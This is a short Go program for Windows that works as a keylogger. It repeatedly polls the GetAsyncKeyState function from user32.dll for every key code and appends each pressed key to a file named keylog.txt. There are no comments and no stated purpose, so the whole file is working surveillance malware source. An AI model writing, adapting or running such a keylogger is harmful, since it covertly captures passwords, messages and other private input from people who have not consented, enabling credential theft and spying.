package main

import (
	"log"
	"os"
	"syscall"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	outputLogFile, _ = os.OpenFile("keylog.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	outputLogger     = log.New(outputLogFile, "", log.LstdFlags)
)

func main() {
	var keyState uintptr

	for {
		for i := 8; i <= 255; i++ {
			keyState, _, _ = getAsyncKeyState.Call(uintptr(i))
			if keyState == 0x8001 || keyState == 0x8000 {
				outputLogger.Printf("%c", i)
			}
		}
	}
}
